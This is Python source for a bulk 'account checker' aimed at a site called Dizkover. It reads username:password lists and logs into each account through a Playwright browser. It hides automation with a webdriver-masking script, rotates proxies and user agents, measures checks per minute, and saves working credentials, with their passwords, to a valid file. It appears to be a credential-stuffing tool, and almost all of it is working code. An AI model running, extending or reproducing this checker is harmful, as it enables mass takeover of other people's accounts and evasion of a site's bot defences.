"""Dizkover account checker.

The login flow is based on a real captured request, not on guesses:

    GET  /site/login            -> HTML form
    POST /site/login            -> LoginForm[user_name], LoginForm[user_password]
                                   (no _csrf field in the captured POST)
    GET  /ajax/loginnotify      -> JSON {"out": 1} after a successful login

The old v2.0 code stopped every account at `input[name="_csrf"]`. That input
does not exist on the current page, so the check could never succeed. Because
Playwright operates the real form, any hidden token the page does render is
submitted by the browser automatically; there is no reason to read it.

Run install.bat once, put accounts in data/ac.txt, then use run.bat.
"""

from __future__ import annotations

import argparse
import asyncio
import inspect
import json
import random
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from core import (
    BANNED,
    ERROR,
    INVALID,
    VALID,
    LoginOutcome,
    ProxyConfig,
    classify_login_result,
    collapse_whitespace,
    format_duration,
    is_login_url,
    parse_account_line,
    parse_proxy,
    safe_filename,
    strip_ansi,
)

try:
    from colorama import Fore, Style, init as colorama_init

    colorama_init(autoreset=True)
except Exception:  # colorama is optional; plain output still works
    class _NoColor:
        def __getattr__(self, _name):
            return ""

    Fore = Style = _NoColor()

try:
    from playwright.async_api import (
        TimeoutError as PWTimeout,
        async_playwright,
    )
except ImportError:  # handled in main() with a clear message
    async_playwright = None
    PWTimeout = Exception

try:
    import requests
except ImportError:  # proxy health check becomes unavailable
    requests = None

import config


BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "data"


def G(text):
    return "{}{}{}".format(Fore.GREEN, text, Style.RESET_ALL)


def R(text):
    return "{}{}{}".format(Fore.RED, text, Style.RESET_ALL)


def Y(text):
    return "{}{}{}".format(Fore.YELLOW, text, Style.RESET_ALL)


def C(text):
    return "{}{}{}".format(Fore.CYAN, text, Style.RESET_ALL)


def W(text):
    return "{}{}{}".format(Fore.WHITE, text, Style.RESET_ALL)


def M(text):
    return "{}{}{}".format(Fore.MAGENTA, text, Style.RESET_ALL)


def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def data_path(name: str) -> Path:
    path = Path(name)
    return path if path.is_absolute() else DATA_DIR / path


def ensure_dirs():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    if config.SAVE_DEBUG_ARTIFACTS:
        data_path(config.DEBUG_DIR).mkdir(parents=True, exist_ok=True)


def read_lines(path: Path):
    try:
        with open(path, "r", encoding="utf-8-sig", errors="replace") as fh:
            return fh.readlines()
    except FileNotFoundError:
        return []


def append_line(path: Path, line: str):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8", errors="replace") as fh:
        fh.write(line + "\n")


class Logger:
    """Console + data/logs.txt writer. The file never contains ANSI codes."""

    def __init__(self, path: Path):
        self.path = path
        self._lock = threading.Lock()

    def write(self, message: str, echo: bool = True):
        clean = strip_ansi(str(message))
        with self._lock:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(clean + "\n")
        if echo:
            print(message, flush=True)


class Stats:
    def __init__(self):
        self.total = 0
        self.valid = 0
        self.invalid = 0
        self.banned = 0
        self.error = 0
        self.skipped = 0
        self.checks = []
        self.start = time.time()
        self.lock = asyncio.Lock()

    def cpm(self) -> int:
        cutoff = time.time() - config.RECORD_CPM_WINDOW
        self.checks = [item for item in self.checks if item >= cutoff]
        return len(self.checks)

    def status_bar(self) -> str:
        return (
            "\r[STATUS] "
            + G("Valid:" + str(self.valid))
            + " | "
            + R("Invalid:" + str(self.invalid))
            + " | "
            + M("Banned:" + str(self.banned))
            + " | "
            + Y("Error:" + str(self.error))
            + " | "
            + W("Total:" + str(self.total))
            + " | CPM:"
            + str(self.cpm())
            + " | "
            + format_duration(time.time() - self.start)
            + "        "
        )


# ---------------------------------------------------------------------------
# Proxy handling
# ---------------------------------------------------------------------------


def check_proxy(proxy: ProxyConfig):
    """requests-level health check: returns (ok, ip, seconds, error)."""
    if requests is None:
        return False, "", 0.0, "requests is not installed"

    session = requests.Session()
    session.trust_env = False
    url = proxy.requests_url()
    started = time.time()
    try:
        response = session.get(
            config.PROXY_TEST_URL,
            proxies={"http": url, "https": url},
            timeout=config.PROXY_TIMEOUT,
        )
        response.raise_for_status()
        elapsed = time.time() - started
        text = (response.text or "").strip()
        ip = ""
        try:
            payload = response.json()
            if isinstance(payload, dict):
                ip = str(payload.get("ip") or payload.get("query") or "")
        except Exception:
            ip = text[:60]
        return True, ip, elapsed, ""
    except Exception as exc:
        elapsed = time.time() - started
        return False, "", elapsed, "{}: {}".format(
            type(exc).__name__, collapse_whitespace(str(exc))[:140]
        )
    finally:
        try:
            session.close()
        except Exception:
            pass


def load_proxies(logger: Logger, no_proxy: bool):
    """Return parsed proxy rows; an empty list means Direct."""
    if no_proxy or not config.USE_PROXY:
        logger.write("[{}] [PROXY] disabled - every check uses Direct".format(ts()))
        return []

    path = data_path(config.PROXY_FILE)
    if not path.exists():
        logger.write(
            "[{}] [PROXY] {} not found - using Direct".format(
                ts(), config.PROXY_FILE
            )
        )
        return []

    parsed = []
    for raw in read_lines(path):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        proxy = parse_proxy(line)
        if proxy is None:
            logger.write(
                "[{}] [PROXY] [SKIP] malformed row: {}".format(ts(), line[:80])
            )
            continue
        parsed.append(proxy)

    if not parsed:
        logger.write(
            "[{}] [PROXY] no usable rows in {} - using Direct".format(
                ts(), config.PROXY_FILE
            )
        )
        return []

    logger.write(
        "[{}] [PROXY] testing {} rows through {} ...".format(
            ts(), len(parsed), config.PROXY_TEST_URL
        )
    )
    return parsed


async def test_proxies(proxies, logger: Logger):
    """Run the requests preflight concurrently and log each result live."""

    async def one(proxy: ProxyConfig):
        ok, ip, seconds, error = await asyncio.to_thread(check_proxy, proxy)
        if ok:
            logger.write(
                "[{}] [PROXY] [WORKING] {} | IP:{} | {:.2f}s".format(
                    ts(), proxy.server, ip or "unknown", seconds
                )
            )
        else:
            logger.write(
                "[{}] [PROXY] [DEAD   ] {} | {}".format(ts(), proxy.server, error)
            )
        return proxy if ok else None

    results = await asyncio.gather(*(one(proxy) for proxy in proxies))
    return [proxy for proxy in results if proxy is not None]


async def browser_proxy_test(proxies, headless: bool, logger: Logger):
    """Open PROXY_TEST_URL in Chromium through each proxy.

    This is the answer to "does this proxy actually carry the browser?".
    """
    if not proxies:
        logger.write("[{}] [PROXY-TEST] nothing to test".format(ts()))
        return

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=headless)
        try:
            for proxy in proxies:
                context = None
                page = None
                started = time.time()
                try:
                    context = await browser.new_context(proxy=proxy.playwright())
                    page = await context.new_page()
                    await page.goto(
                        config.PROXY_TEST_URL,
                        wait_until="domcontentloaded",
                        timeout=config.TIMEOUT,
                    )
                    body = collapse_whitespace(await page.inner_text("body"))[:120]
                    ip = ""
                    try:
                        payload = json.loads(body)
                        if isinstance(payload, dict):
                            ip = str(payload.get("ip") or "")
                    except Exception:
                        pass
                    logger.write(
                        "[{}] [PROXY-TEST] [OK]   {} | browser-ip:{} | {:.2f}s".format(
                            ts(),
                            proxy.server,
                            ip or body or "loaded",
                            time.time() - started,
                        )
                    )
                except Exception as exc:
                    logger.write(
                        "[{}] [PROXY-TEST] [FAIL] {} | {}: {}".format(
                            ts(),
                            proxy.server,
                            type(exc).__name__,
                            collapse_whitespace(str(exc))[:140],
                        )
                    )
                finally:
                    if page is not None:
                        await close_quietly(page)
                    if context is not None:
                        await close_quietly(context)
        finally:
            await close_quietly(browser)


# ---------------------------------------------------------------------------
# Browser helpers
# ---------------------------------------------------------------------------


async def close_quietly(obj):
    try:
        await obj.close()
    except Exception:
        pass


STEALTH_SCRIPT = """
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
window.chrome = { runtime: {}, app: {} };
"""

USER_SELECTORS = [
    'input[name="LoginForm[user_name]"]',
    "#loginform-user_name",
    'input[name="username"]',
    'form input[type="text"]',
]

PASS_SELECTORS = [
    'input[name="LoginForm[user_password]"]',
    "#loginform-user_password",
    'input[name="password"]',
    'form input[type="password"]',
]

SUBMIT_SELECTORS = [
    'button[type="submit"]',
    'input[type="submit"]',
    "button.btn-primary",
    "button.btn-login",
    ".btn-primary",
]

ERROR_SELECTORS = [
    ".help-block",
    ".alert-danger",
    ".alert.alert-danger",
    ".error-summary",
    ".invalid-feedback",
    ".has-error .help-block",
    '[role="alert"]',
]

CAPTCHA_SELECTORS = [
    'iframe[title*="challenge" i]',
    'iframe[src*="/recaptcha/enterprise/bframe"]',
    'iframe[src*="hcaptcha.com"][title*="challenge" i]',
    ".rc-imageselect",
    "#challenge-form",
]


async def find_visible(page, selectors, timeout_ms: int):
    """Return (locator, selector) for the first visible match, else (None, '')."""
    deadline = time.monotonic() + timeout_ms / 1000.0
    while time.monotonic() < deadline:
        for selector in selectors:
            locator = page.locator(selector).first
            try:
                if await locator.count() and await locator.is_visible():
                    return locator, selector
            except Exception:
                continue
        await asyncio.sleep(0.25)
    return None, ""


async def read_error_text(page) -> str:
    for selector in ERROR_SELECTORS:
        locator = page.locator(selector)
        try:
            count = await locator.count()
        except Exception:
            continue
        for index in range(min(count, 5)):
            item = locator.nth(index)
            try:
                if not await item.is_visible():
                    continue
                text = collapse_whitespace(await item.inner_text())
            except Exception:
                continue
            if not text:
                continue
            lowered = text.lower()
            if "captcha" in lowered or "recaptcha" in lowered:
                continue
            return text[:200]
    return ""


async def captcha_visible(page) -> bool:
    """Detect a *challenge*, not the invisible reCAPTCHA script/badge.

    The old whole-page `"captcha" in html` test fired on every login page
    because reCAPTCHA Enterprise is loaded there even when no challenge is
    shown. That false positive is why valid accounts were reported as errors.
    """
    for selector in CAPTCHA_SELECTORS:
        locator = page.locator(selector)
        try:
            count = await locator.count()
        except Exception:
            continue
        for index in range(min(count, 3)):
            try:
                if await locator.nth(index).is_visible():
                    return True
            except Exception:
                continue

    # A real v2 checkbox widget is ~304x78; the invisible badge is 70x70 or
    # a 256x60 pill. Only the larger widget means the user must solve it.
    try:
        frames = page.locator('iframe[src*="/recaptcha/"][title]')
        count = await frames.count()
        for index in range(min(count, 4)):
            frame = frames.nth(index)
            if not await frame.is_visible():
                continue
            box = await frame.bounding_box()
            title = (await frame.get_attribute("title")) or ""
            if (
                box
                and box.get("width", 0) >= 280
                and box.get("height", 0) >= 60
                and "recaptcha" in title.lower()
            ):
                return True
    except Exception:
        pass
    return False


async def is_banned_page(page) -> bool:
    try:
        if "/banned" in (page.url or "").lower():
            return True
    except Exception:
        pass
    try:
        text = (await page.inner_text("body")).lower()
    except Exception:
        return False
    return (
        "you are banned" in text
        or "account has been banned" in text
        or "account is banned" in text
        or "your account is suspended" in text
    )


async def fetch_loginnotify(page):
    """Ask the site's own post-login endpoint. Returns (out, payload)."""
    script = """
    async (url) => {
      try {
        const response = await fetch(url, {
          method: 'GET',
          credentials: 'include',
          headers: {
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json'
          }
        });
        const text = await response.text();
        try {
          return JSON.parse(text);
        } catch (e) {
          return { raw: text.slice(0, 240), httpStatus: response.status };
        }
      } catch (e) {
        return { error: String(e) };
      }
    }
    """
    try:
        payload = await page.evaluate(script, config.LOGIN_NOTIFY_URL)
    except Exception as exc:
        return None, {"error": "{}: {}".format(type(exc).__name__, str(exc)[:140])}

    if isinstance(payload, dict):
        out = payload.get("out")
        if isinstance(out, bool):
            return int(out), payload
        if isinstance(out, int):
            return out, payload
        if isinstance(out, str) and out.strip().isdigit():
            return int(out.strip()), payload
    return None, payload


async def save_debug_artifacts(page, username: str, logger: Logger):
    if not config.SAVE_DEBUG_ARTIFACTS:
        return []
    folder = data_path(config.DEBUG_DIR)
    folder.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S-%f")[:-3]
    base = "{}_{}".format(safe_filename(username), stamp)
    png_path = folder / (base + ".png")
    html_path = folder / (base + ".html")
    saved = []

    try:
        await page.screenshot(path=str(png_path), full_page=False)
        saved.append(str(png_path))
    except Exception:
        pass
    try:
        html = await page.content()
        with open(html_path, "w", encoding="utf-8", errors="replace") as fh:
            fh.write(html)
        saved.append(str(html_path))
    except Exception:
        pass

    # Keep only the newest N pairs so data/debug does not grow forever.
    try:
        files = sorted(
            folder.glob("*"),
            key=lambda item: item.stat().st_mtime,
            reverse=True,
        )
        limit = max(0, int(config.MAX_DEBUG_ARTIFACTS) * 2)
        for old in files[limit:]:
            try:
                old.unlink()
            except Exception:
                pass
    except Exception:
        pass

    if saved:
        logger.write(
            "[{}] [DEBUG] saved artifact(s): {}".format(ts(), ", ".join(saved))
        )
    return saved


async def check_account(
    context,
    username: str,
    password: str,
    proxy: Optional[ProxyConfig],
    logger: Logger,
) -> LoginOutcome:
    page = None
    step = "init"
    label = "Direct" if proxy is None else proxy.server
    started = time.time()

    try:
        page = await context.new_page()
        page.set_default_timeout(config.TIMEOUT)
        if config.STEALTH_INIT_SCRIPT:
            await page.add_init_script(STEALTH_SCRIPT)

        # The browser itself must be able to use the proxy, not only requests.
        if proxy is not None and config.VERIFY_PROXY_IN_BROWSER:
            step = "proxy_check"
            try:
                await page.goto(
                    config.PROXY_TEST_URL,
                    wait_until="domcontentloaded",
                    timeout=config.TIMEOUT,
                )
                body = collapse_whitespace(await page.inner_text("body"))[:160]
                logger.write(
                    "[{}] [PROXY] [BROWSER-OK] [{}] {} | {}".format(
                        ts(), username, label, body or "loaded"
                    )
                )
            except Exception as exc:
                logger.write(
                    "[{}] [ERROR] [{}] proxy_check failed via {} | {}: {}".format(
                        ts(),
                        username,
                        label,
                        type(exc).__name__,
                        collapse_whitespace(str(exc))[:160],
                    )
                )
                return LoginOutcome(
                    ERROR,
                    "proxy check failed: {}: {}".format(
                        type(exc).__name__, collapse_whitespace(str(exc))[:120]
                    ),
                    step,
                )

        step = "page_load"
        response = await page.goto(
            config.LOGIN_URL,
            wait_until="domcontentloaded",
            timeout=config.TIMEOUT,
        )
        http_status = response.status if response is not None else "?"
        title = ""
        try:
            title = await page.title()
        except Exception:
            pass
        logger.write(
            "[{}] [DEBUG] [{}] GET {} -> {} | title={!r} | url={} | proxy={}".format(
                ts(),
                username,
                config.LOGIN_PATH,
                http_status,
                title[:80],
                page.url,
                label,
            )
        )
        if isinstance(http_status, int) and http_status >= 400:
            await save_debug_artifacts(page, username, logger)
            return LoginOutcome(
                ERROR, "login page HTTP {}".format(http_status), step
            )

        step = "challenge_check"
        try:
            body_text = collapse_whitespace(await page.inner_text("body")).lower()
        except Exception:
            body_text = ""
        if (
            "just a moment" in body_text
            or "checking your browser" in body_text
            or "enable javascript and cookies" in body_text
            or "cf-challenge" in (page.url or "").lower()
        ):
            logger.write(
                "[{}] [ERROR] [{}] anti-bot challenge page | url={} | proxy={}".format(
                    ts(), username, page.url, label
                )
            )
            await save_debug_artifacts(page, username, logger)
            return LoginOutcome(
                ERROR, "anti-bot challenge page (not bypassed)", step
            )

        step = "find_form"
        user_field, user_selector = await find_visible(
            page, USER_SELECTORS, config.TIMEOUT
        )
        pass_field, pass_selector = await find_visible(
            page, PASS_SELECTORS, 5000
        )
        if user_field is None or pass_field is None:
            logger.write(
                "[{}] [ERROR] [{}] login form not found | url={} | title={!r}".format(
                    ts(), username, page.url, title[:80]
                )
            )
            await save_debug_artifacts(page, username, logger)
            return LoginOutcome(
                ERROR,
                "login form not found (user={}, pass={})".format(
                    bool(user_field), bool(pass_field)
                ),
                step,
            )

        csrf = await page.query_selector('input[name="_csrf"]')
        logger.write(
            "[{}] [DEBUG] [{}] form user={} pass={} csrf_hidden={}".format(
                ts(),
                username,
                user_selector,
                pass_selector,
                "present (browser submits it automatically)"
                if csrf
                else "absent (expected on this page; not required)",
            )
        )

        step = "fill_form"
        await user_field.click()
        await user_field.fill("")
        await user_field.fill(username)
        await asyncio.sleep(random.uniform(0.1, 0.3))
        await pass_field.click()
        await pass_field.fill("")
        await pass_field.fill(password)
        await asyncio.sleep(random.uniform(0.2, 0.5))

        step = "submit"
        url_before = page.url
        submitted = False
        for selector in SUBMIT_SELECTORS:
            button = page.locator(selector).first
            try:
                if await button.count() and await button.is_visible():
                    await button.click()
                    submitted = True
                    logger.write(
                        "[{}] [DEBUG] [{}] clicked {}".format(ts(), username, selector)
                    )
                    break
            except Exception:
                continue
        if not submitted:
            await page.keyboard.press("Enter")
            logger.write(
                "[{}] [DEBUG] [{}] no submit button found, pressed Enter".format(
                    ts(), username
                )
            )

        step = "wait_result"
        deadline = time.monotonic() + config.RESULT_TIMEOUT / 1000.0
        captcha = False
        banned = False
        error_text = ""
        while time.monotonic() < deadline:
            await asyncio.sleep(0.5)
            if await captcha_visible(page):
                captcha = True
                break
            if await is_banned_page(page):
                banned = True
                break
            error_text = await read_error_text(page)
            if error_text:
                break
            if not is_login_url(page.url, config.LOGIN_PATH):
                break

        api_out = None
        api_payload = None
        if not captcha and not banned and not error_text:
            step = "api_verify"
            api_out, api_payload = await fetch_loginnotify(page)
            logger.write(
                "[{}] [DEBUG] [{}] loginnotify -> {}".format(
                    ts(), username, json.dumps(api_payload, ensure_ascii=False)[:240]
                )
            )

        outcome = classify_login_result(
            url_before=url_before,
            url_after=page.url,
            error_text=error_text,
            captcha=captcha,
            banned=banned,
            api_out=api_out,
            login_path=config.LOGIN_PATH,
        )

        if outcome.status == VALID:
            try:
                cookies = await context.cookies()
                cookie_names = ",".join(sorted({item["name"] for item in cookies}))
            except Exception:
                cookie_names = ""
            logger.write(
                "[{}] [SUCCESS] [{}] {} | {} | cookies={} | {:.2f}s".format(
                    ts(),
                    username,
                    outcome.status,
                    outcome.detail,
                    cookie_names or "?",
                    time.time() - started,
                )
            )
        elif outcome.status == INVALID:
            logger.write(
                "[{}] [INVALID] [{}] {} | {:.2f}s".format(
                    ts(), username, outcome.detail, time.time() - started
                )
            )
        elif outcome.status == BANNED:
            logger.write(
                "[{}] [BANNED] [{}] {} | {:.2f}s".format(
                    ts(), username, outcome.detail, time.time() - started
                )
            )
            await save_debug_artifacts(page, username, logger)
        else:
            logger.write(
                "[{}] [ERROR] [{}] {} | step={} | url={} | {:.2f}s".format(
                    ts(),
                    username,
                    outcome.detail,
                    outcome.step,
                    page.url,
                    time.time() - started,
                )
            )
            await save_debug_artifacts(page, username, logger)

        return outcome

    except PWTimeout as exc:
        logger.write(
            "[{}] [ERROR] [{}] timeout at step={} | {} | proxy={}".format(
                ts(), username, step, collapse_whitespace(str(exc))[:140], label
            )
        )
        if page is not None:
            await save_debug_artifacts(page, username, logger)
        return LoginOutcome(ERROR, "timeout at {}".format(step), step)
    except Exception as exc:
        logger.write(
            "[{}] [ERROR] [{}] {}: {} | step={} | proxy={}".format(
                ts(),
                username,
                type(exc).__name__,
                collapse_whitespace(str(exc))[:180],
                step,
                label,
            )
        )
        if page is not None:
            await save_debug_artifacts(page, username, logger)
        return LoginOutcome(
            ERROR,
            "{}: {}".format(type(exc).__name__, collapse_whitespace(str(exc))[:140]),
            step,
        )
    finally:
        if page is not None:
            await close_quietly(page)


def write_result_files(outcome: LoginOutcome, username, password, proxy_label, logger):
    stamp = ts()
    if outcome.status == VALID:
        append_line(
            data_path(config.VALID_FILE),
            "{}:{} | proxy={} | via={} | time={}".format(
                username, password, proxy_label, outcome.detail, stamp
            ),
        )
    elif outcome.status == INVALID:
        append_line(
            data_path(config.INVALID_FILE),
            "{}:{} | reason={} | proxy={} | time={}".format(
                username, password, outcome.detail, proxy_label, stamp
            ),
        )
    elif outcome.status == BANNED:
        append_line(
            data_path(config.BANNED_FILE),
            "{}:{} | proxy={} | time={}".format(
                username, password, proxy_label, stamp
            ),
        )
    else:
        append_line(
            data_path(config.ERRORS_FILE),
            "{} | reason={} | step={} | proxy={} | time={}".format(
                username, outcome.detail, outcome.step, proxy_label, stamp
            ),
        )


async def process_account(
    semaphore,
    browser,
    line: str,
    proxies,
    index: int,
    stats: Stats,
    logger: Logger,
):
    async with semaphore:
        parsed_account = parse_account_line(line)
        if parsed_account is None:
            async with stats.lock:
                stats.skipped += 1
            logger.write(
                "[{}] [WARN] malformed account row skipped: {!r}".format(
                    ts(), line.strip()[:80]
                )
            )
            return

        username, password = parsed_account
        proxy = proxies[index % len(proxies)] if proxies else None
        proxy_label = "Direct" if proxy is None else proxy.server

        await asyncio.sleep(random.uniform(config.DELAY_MIN, config.DELAY_MAX))

        context_options = {
            "viewport": random.choice(config.VIEWPORTS),
            "locale": "en-US",
        }
        if config.SET_TIMEZONE:
            context_options["timezone_id"] = config.TIMEZONE_ID
        if config.USE_RANDOM_UA:
            context_options["user_agent"] = random.choice(config.USER_AGENTS)
        if proxy is not None:
            context_options["proxy"] = proxy.playwright()

        outcome = LoginOutcome(ERROR, "not started", "init")
        attempts = max(1, int(config.MAX_RETRY))
        for attempt in range(1, attempts + 1):
            context = None
            try:
                logger.write(
                    "[{}] [START] [{}] attempt={}/{} proxy={}".format(
                        ts(), username, attempt, attempts, proxy_label
                    )
                )
                context = await browser.new_context(**context_options)
                outcome = await check_account(
                    context, username, password, proxy, logger
                )
            except Exception as exc:
                outcome = LoginOutcome(
                    ERROR,
                    "{}: {}".format(
                        type(exc).__name__, collapse_whitespace(str(exc))[:140]
                    ),
                    "context",
                )
                logger.write(
                    "[{}] [ERROR] [{}] context error: {} | proxy={}".format(
                        ts(), username, outcome.detail, proxy_label
                    )
                )
            finally:
                if context is not None:
                    await close_quietly(context)

            retryable = outcome.status == ERROR and outcome.step not in (
                "captcha",
                "banned",
            )
            if not retryable or attempt >= attempts:
                break
            logger.write(
                "[{}] [RETRY] [{}] attempt {}/{} | {} | step={}".format(
                    ts(), username, attempt, attempts, outcome.detail, outcome.step
                )
            )
            await asyncio.sleep(2)

        async with stats.lock:
            stats.total += 1
            stats.checks.append(time.time())
            if outcome.status == VALID:
                stats.valid += 1
                message = "{} [VALID]   {} | {} | proxy={}".format(
                    ts(), username, outcome.detail, proxy_label
                )
                print("\n" + G(message), flush=True)
            elif outcome.status == INVALID:
                stats.invalid += 1
                message = "{} [INVALID] {} | {} | proxy={}".format(
                    ts(), username, outcome.detail, proxy_label
                )
                print("\n" + R(message), flush=True)
            elif outcome.status == BANNED:
                stats.banned += 1
                message = "{} [BANNED]  {} | proxy={}".format(
                    ts(), username, proxy_label
                )
                print("\n" + M(message), flush=True)
            else:
                stats.error += 1
                message = "{} [ERROR]   {} | {} | step={} | proxy={}".format(
                    ts(), username, outcome.detail, outcome.step, proxy_label
                )
                print("\n" + Y(message), flush=True)

            logger.write(message, echo=False)
            write_result_files(
                outcome, username, password, proxy_label, logger
            )
            sys.stdout.write(stats.status_bar())
            sys.stdout.flush()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def load_accounts():
    path = data_path(config.ACCOUNTS_FILE)
    accounts = []
    seen = set()
    for raw in read_lines(path):
        parsed = parse_account_line(raw)
        if parsed is None:
            continue
        username, password = parsed
        if username in seen:
            continue
        seen.add(username)
        accounts.append("{}:{}".format(username, password))
    return accounts


def print_banner(account_count, proxies, headless):
    print(C("=" * 64))
    print(W("  Dizkover Checker 2.1"))
    print(C("  Playwright login verification | proxy health | live logs"))
    print(C("=" * 64))
    print("  Accounts : {}".format(W(str(account_count))))
    print(
        "  Proxies  : {}".format(
            G("{} working".format(len(proxies)))
            if proxies
            else Y("none / Direct")
        )
    )
    print("  Mode     : {}".format(W("Headless" if headless else "Visible")))
    print("  Tabs     : {}".format(W(str(config.MAX_TABS))))
    print("  Data     : {}".format(W(str(DATA_DIR))))
    print(C("-" * 64))


async def run(args):
    ensure_dirs()
    logger = Logger(data_path(config.LOG_FILE))
    headless = False if args.visible else (True if args.headless else config.HEADLESS)
    if args.tabs:
        config.MAX_TABS = max(1, int(args.tabs))
    if args.timeout:
        config.TIMEOUT = max(5000, int(args.timeout) * 1000)

    logger.write("=" * 70)
    logger.write(
        "[{}] Dizkover Checker 2.1 started | headless={} | tabs={}".format(
            ts(), headless, config.MAX_TABS
        )
    )
    logger.write("=" * 70)

    proxies = load_proxies(logger, args.no_proxy)
    if proxies:
        working = await test_proxies(proxies, logger)
        if not working:
            logger.write(
                "[{}] [PROXY] no working proxy - {}".format(
                    ts(),
                    "stopping (REQUIRE_PROXY=True)"
                    if config.REQUIRE_PROXY
                    else "falling back to Direct",
                )
            )
        proxies = working
    if (
        config.REQUIRE_PROXY
        and config.USE_PROXY
        and not args.no_proxy
        and not proxies
    ):
        logger.write("[{}] [ERROR] REQUIRE_PROXY=True but 0 proxies work".format(ts()))
        return 3

    if args.test_proxies:
        print_banner(0, proxies, headless)
        await browser_proxy_test(proxies, headless, logger)
        logger.write("[{}] [PROXY-TEST] finished".format(ts()))
        return 0

    accounts = load_accounts()
    if args.account:
        wanted = {item.strip().lower() for item in args.account if item.strip()}
        accounts = [
            line
            for line in accounts
            if parse_account_line(line)[0].lower() in wanted
        ]

    if not accounts:
        logger.write(
            "[{}] [ERROR] 0 accounts in {}".format(
                ts(), data_path(config.ACCOUNTS_FILE)
            )
        )
        print(Y("\n[!] No accounts found."))
        print("    Put rows like  username:password  into:")
        print("    " + str(data_path(config.ACCOUNTS_FILE)))
        print("    Then run this again (or use Edit accounts in run.bat).")
        return 2

    print_banner(len(accounts), proxies, headless)
    logger.write(
        "[{}] [CONFIG] accounts={} | proxies={} | tabs={} | headless={}".format(
            ts(), len(accounts), len(proxies), config.MAX_TABS, headless
        )
    )

    if async_playwright is None:
        logger.write(
            "[{}] [ERROR] playwright is not installed - run install.bat".format(ts())
        )
        print(R("\n[X] playwright is missing. Run install.bat first."))
        return 1

    stats = Stats()
    semaphore = asyncio.Semaphore(max(1, int(config.MAX_TABS)))

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=headless)
        logger.write(
            "[{}] [INFO] Chromium launched | headless={}".format(ts(), headless)
        )
        try:
            tasks = [
                process_account(
                    semaphore,
                    browser,
                    line,
                    proxies,
                    index,
                    stats,
                    logger,
                )
                for index, line in enumerate(accounts)
            ]
            await asyncio.gather(*tasks)
        finally:
            await close_quietly(browser)

    elapsed = time.time() - stats.start
    avg_cpm = int(stats.total / elapsed * 60) if elapsed > 0 else 0
    summary = "\n".join(
        [
            "",
            "===== FINAL REPORT =====",
            "Total   : {}".format(stats.total),
            "Valid   : {}".format(stats.valid),
            "Invalid : {}".format(stats.invalid),
            "Banned  : {}".format(stats.banned),
            "Error   : {}".format(stats.error),
            "Skipped : {}".format(stats.skipped),
            "Time    : {}".format(format_duration(elapsed)),
            "Avg CPM : {}".format(avg_cpm),
            "========================",
        ]
    )
    logger.write(summary)

    print("\n" + C("=" * 52))
    print("  " + G("Run complete"))
    print(C("=" * 52))
    print("  Total   : {}".format(stats.total))
    print("  Valid   : {}".format(G(str(stats.valid))))
    print("  Invalid : {}".format(R(str(stats.invalid))))
    print("  Banned  : {}".format(M(str(stats.banned))))
    print("  Error   : {}".format(Y(str(stats.error))))
    print("  Time    : {} (avg CPM {})".format(format_duration(elapsed), avg_cpm))
    print(C("-" * 52))
    print("  valid   -> {}".format(data_path(config.VALID_FILE)))
    print("  invalid -> {}".format(data_path(config.INVALID_FILE)))
    print("  logs    -> {}".format(data_path(config.LOG_FILE)))
    print(C("=" * 52))
    return 0


def parse_args(argv=None):
    parser = argparse.ArgumentParser(description="Dizkover account checker")
    parser.add_argument("--headless", action="store_true", help="force headless")
    parser.add_argument("--visible", action="store_true", help="show the browser")
    parser.add_argument("--tabs", type=int, help="concurrent accounts/tabs")
    parser.add_argument(
        "--account",
        action="append",
        default=[],
        help="only check this username (repeatable)",
    )
    parser.add_argument("--no-proxy", action="store_true", help="ignore proxy.txt")
    parser.add_argument(
        "--test-proxies",
        action="store_true",
        help="health-check proxy.txt in requests and in Chromium, then exit",
    )
    parser.add_argument(
        "--timeout", type=int, help="page timeout in seconds (default 30)"
    )
    return parser.parse_args(argv)


def _run_async(args):
    """Windows must use Proactor for Playwright subprocesses.

    Python 3.14 deprecates the policy system, so use `loop_factory` when the
    runtime supports it (3.12+) and let the default Proactor policy handle
    older versions. This removes the DeprecationWarning from the old code.
    """
    if sys.platform == "win32":
        loop_class = getattr(asyncio, "ProactorEventLoop", None)
        supports_factory = "loop_factory" in inspect.signature(asyncio.run).parameters
        if loop_class is not None and supports_factory:
            return asyncio.run(run(args), loop_factory=loop_class)
    return asyncio.run(run(args))


def main():
    # UTF-8 console without replacing sys.stdout (colorama needs the original).
    for stream_name in ("stdout", "stderr"):
        stream = getattr(sys, stream_name, None)
        try:
            if stream is not None and hasattr(stream, "reconfigure"):
                stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

    args = parse_args()
    if async_playwright is None:
        print("[X] playwright is not installed. Run install.bat first.")
        return 1

    try:
        return _run_async(args)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
